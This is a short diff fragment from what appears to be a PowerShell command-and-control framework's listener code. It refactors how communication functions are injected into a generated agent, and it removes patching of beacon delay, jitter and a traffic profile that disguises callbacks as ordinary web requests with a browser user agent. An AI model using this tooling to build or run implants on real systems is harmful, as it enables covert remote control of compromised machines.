@@ -688,18 +688,12 @@ class Listener:
 
             # patch in the comms methods
             commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
-            code = code.replace('REPLACE_COMMS', commsCode)
+            code = code.replace('#LISTENER_DICT', commsCode[0])
+            code = code.replace('#COMM_FUNCTION', commsCode[1])
 
             # strip out comments and blank lines
             code = helpers.strip_powershell_comments(code)
-
-            # patch in the delay, jitter, lost limit, and comms profile
-            code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
-            code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
-            code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
-            code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
-            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+str(b64DefaultResponse)+'"')
-
+            
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
                 code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
